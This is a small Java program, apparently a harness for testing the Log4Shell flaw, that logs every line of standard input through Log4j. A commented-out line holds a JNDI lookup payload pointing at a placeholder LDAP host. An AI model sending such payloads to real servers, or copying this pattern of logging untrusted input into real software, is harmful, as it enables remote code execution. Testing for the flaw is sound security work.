package io.ajuvonen.log4stdin;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4stdin 
{

    private static final Logger log = LogManager.getLogger("log4stdin");

    public static void main(String[] args) {
        // System.out.println("----- printStdout started -------");
        // log.info("${jndi:ldap://test.tld/a}");
        
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(System.in))) {
        String line = null;
        while (true) {
            if ((line = reader.readLine()) != null) {
            // System.out.println(line);
            log.info(line);
            } else {
                //input finishes
                // System.out.println("----- input end -------");
            break;
            }
        }
        } catch (Exception e) {
            System.err.println(e);
        }
    }
}
